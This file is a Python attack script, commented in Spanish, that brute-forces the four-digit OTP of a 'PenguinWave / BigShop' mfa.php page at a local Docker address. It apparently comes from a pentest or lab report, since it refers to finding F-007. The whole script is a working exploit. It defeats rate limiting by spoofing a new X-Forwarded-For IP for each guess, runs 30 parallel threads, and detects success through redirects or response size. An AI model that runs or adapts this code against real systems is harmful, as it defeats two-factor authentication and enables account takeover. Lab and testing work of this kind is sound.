#!/usr/bin/env python3
"""
Fuerza bruta del OTP de mfa.php (PenguinWave / BigShop), explotando el
bypass del rate-limit mediante la cabecera X-Forwarded-For (ver F-007).

Uso:
    1. Edita COOKIE con un PHPSESSID válido (login admin:admin ya hecho,
       parado en la pantalla de verificación en dos pasos).
    2. python3 mfa_bruteforce.py
"""

import requests
import concurrent.futures
import threading

TARGET = "http://172.17.0.2:8080/mfa.php"
COOKIE = "PHPSESSID=PON_AQUI_TU_COOKIE_ACTUAL"
MAX_WORKERS = 30
TIMEOUT = 5

found = threading.Event()
result = {}
known_wrong_sizes = set()
print_lock = threading.Lock()


def baseline():
    """Pide un código obviamente incorrecto para fijar el tamaño 'normal' de respuesta."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": COOKIE,
        "X-Forwarded-For": "10.0.0.1",
    }
    r = requests.post(TARGET, data="otp=9998", headers=headers,
                       allow_redirects=False, timeout=TIMEOUT)
    known_wrong_sizes.add(len(r.content))
    print(f"[*] Baseline 'código incorrecto': status={r.status_code} "
          f"len={len(r.content)} bytes")


def fake_ip(n: int) -> str:
    """Genera una IP distinta por cada código, para resetear el contador cada vez."""
    return f"10.{(n >> 16) & 255}.{(n >> 8) & 255}.{n & 255}"


def try_otp(code: int):
    if found.is_set():
        return

    otp = f"{code:04d}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": COOKIE,
        "X-Forwarded-For": fake_ip(code),
    }

    try:
        r = requests.post(TARGET, data=f"otp={otp}", headers=headers,
                           allow_redirects=False, timeout=TIMEOUT)
    except requests.RequestException as e:
        with print_lock:
            print(f"[!] Error con otp={otp}: {e}")
        return

    location = r.headers.get("Location", "")
    is_success_redirect = r.status_code in (301, 302, 303, 307, 308) and "dashboard.php" in location
    is_different_size = len(r.content) not in known_wrong_sizes

    if is_success_redirect or (r.status_code == 200 and is_different_size):
        with print_lock:
            print(f"[+] CANDIDATO -> otp={otp} status={r.status_code} "
                  f"len={len(r.content)} location={location}")
        if is_success_redirect:
            found.set()
            result["otp"] = otp
            result["status"] = r.status_code
            result["location"] = location

    if code % 500 == 0:
        with print_lock:
            print(f"[*] Progreso: {code}/9999 probados...")


def main():
    baseline()
    print(f"[*] Lanzando fuerza bruta con {MAX_WORKERS} hilos en paralelo...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = [ex.submit(try_otp, c) for c in range(10000)]
        for _ in concurrent.futures.as_completed(futures):
            if found.is_set():
                break

    print()
    if result:
        print("=== CÓDIGO ENCONTRADO ===")
        print(f"OTP:      {result['otp']}")
        print(f"Status:   {result['status']}")
        print(f"Location: {result['location']}")
    else:
        print("No se encontró ningún candidato claro por redirect. "
              "Revisa arriba los 'CANDIDATO' con status 200 y tamaño distinto "
              "al baseline — puede que el éxito no redirija.")


if __name__ == "__main__":
    main()
